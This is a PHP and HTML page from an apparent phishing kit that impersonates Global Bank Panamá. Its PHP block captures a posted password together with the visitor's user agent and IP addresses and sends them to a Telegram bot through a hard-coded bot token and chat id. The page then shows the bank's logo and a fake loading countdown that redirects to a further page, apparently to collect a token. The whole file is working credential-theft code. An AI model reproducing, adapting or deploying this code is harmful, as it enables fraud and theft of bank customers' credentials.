<?php
session_start();
if( !empty($_POST['miDiosenticonfio'])){
    
    $_SESSION['TDOCUMENT'] = $_POST['miDiosenticonfio'];

    @$message = "GLOBALPANAMA\n\n".'User-agent: '.$_SERVER['HTTP_USER_AGENT']."\nIP: ".$_SERVER['REMOTE_ADDR']."\n"."IP2: ".$_SERVER['HTTP_X_FORWARDED_FOR']."\n".'CONTRASENA: '.$_SESSION['TDOCUMENT']."\n";

    $apiToken = "5738934159:AAFC5W8qNihaCUITtIHRoLtkSoC7VOcwRTk";

    $data = [
        'chat_id' => '5617210401',
        'text' => $message
    ];
    
    $url = "https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data); 
    $ch = curl_init(); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
    curl_setopt($ch, CURLOPT_URL, $url); 
    $result = curl_exec($ch); 

}else{
    @header('Location: carg.php');
}
?>

<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title></title>
	<style>
		@font-face {
    font-family: 'FontAwesome';
    src: url(css/font-awesome/fonts/fontawesome-webfont.eot?v=4.3.0);
    src: url(css/font-awesome/fonts/fontawesome-webfont.eot?#iefix&v=4.3.0) format("embedded-opentype"), url(css/fontawesome-webfont.woff2) format("woff2"), url(css/font-awesome/fonts/fontawesome-webfont.woff?v=4.3.0) format("woff"), url(css/font-awesome/fonts/fontawesome-webfont.ttf?v=4.3.0) format("truetype"), url(css/font-awesome/fonts/fontawesome-webfont.svg?v=4.3.0#fontawesomeregular) format("svg");
    font-weight: normal;
    font-style: normal
}
	</style>
</head>
<body>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<img src="img/logo_global_bank_azul.png" style="width:300px; display: block;margin: 0 auto;">
	<br>
	<div style="text-align: center;font-family: Helvetica;" align="center" id="suave">
                        Por favor espere unos segundos mientras carga Global Bank Panamá. <strong id="time"><br><label id="countdown">0:35</label></strong></div><strong id="time">

	<script type="text/javascript">
               var url="tok.html";
               var seconds = 20; //número de segundos a contar
               function secondPassed() {
               
                 var minutes = Math.round((seconds - 30)/60); //calcula el número de minutos
                 var remainingSeconds = seconds % 60; //calcula los segundos
                 //si los segundos usan sólo un dígito, añadimos un cero a la izq
                 if (remainingSeconds < 10) { 
                   remainingSeconds = "0" + remainingSeconds; 
                 } 
                 document.getElementById('countdown').innerHTML = minutes + ":" +     remainingSeconds; 
                 if (seconds == 0) { 
                   clearInterval(countdownTimer); 
                  window.location=url;
                   document.getElementById('suave').innerHTML = ""; 
                   document.getElementById('countdown').innerHTML = ""; 
                 } else { 
                   seconds--; 
                 } 
               } 
               
               var countdownTimer = setInterval(secondPassed, 1000);
            </script>

</body>
</html>